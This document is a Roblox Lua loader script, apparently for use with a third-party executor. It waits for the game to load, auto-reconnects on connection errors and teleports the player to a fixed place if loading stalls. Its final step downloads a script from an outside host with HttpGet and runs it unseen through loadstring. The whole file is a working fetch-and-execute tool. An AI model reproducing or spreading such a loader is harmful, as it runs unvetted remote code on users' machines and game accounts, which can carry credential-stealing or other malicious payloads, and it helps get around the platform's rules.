if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

local PLACE_ID = 3260590327
local TIMEOUT = 60

local LoaderActive = true
local ReconnectCheckRunning = false

local function Reconnect()
    if not LoaderActive or ReconnectCheckRunning then
        return
    end

    ReconnectCheckRunning = true

    task.spawn(function()
        task.wait(2)

        if LoaderActive then
            pcall(function()
                TeleportService:TeleportReconnect()
            end)
        end

        ReconnectCheckRunning = false
    end)
end

local ErrorConnection =
    GuiService.ErrorMessageChanged:Connect(function()
        local code = GuiService:GetErrorCode()

        if code and code ~= Enum.ConnectionError.OK then
            Reconnect()
        end
    end)

local PromptConnection

pcall(function()
    local promptOverlay =
        CoreGui
            :WaitForChild("RobloxPromptGui")
            :WaitForChild("promptOverlay")

    PromptConnection =
        promptOverlay.ChildAdded:Connect(function(child)
            if child.Name == "ErrorPrompt" then
                Reconnect()
            end
        end)
end)

local existingCode = GuiService:GetErrorCode()

if existingCode and existingCode ~= Enum.ConnectionError.OK then
    Reconnect()
end

local function IsLoading()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    local loadingScreen =
        playerGui and playerGui:FindFirstChild("LoadingScreen")

    local content =
        loadingScreen and loadingScreen:FindFirstChild("content")

    return
        LocalPlayer:GetAttribute("Loading") == true
        or LocalPlayer:GetAttribute("Teleporting") == true
        or (content and content.Visible == true)
end

local startedAt = os.clock()

while IsLoading() do
    if os.clock() - startedAt >= TIMEOUT then
        pcall(function()
            TeleportService:Teleport(
                PLACE_ID,
                LocalPlayer
            )
        end)

        return
    end

    task.wait(1)
end

local ok, err = pcall(function()
    loadstring(
        game:HttpGet(
            "https://api.jnkie.com/api/v1/luascripts/public/ae2ea57b4cd5f98d9b0b503177071f4a01abda37bb24001bcff6a46add690b2e/download"
        )
    )()
end)

LoaderActive = false

if ErrorConnection then
    ErrorConnection:Disconnect()
end

if PromptConnection then
    PromptConnection:Disconnect()
end

ReconnectCheckRunning = false

if not ok then
    warn(err)
end
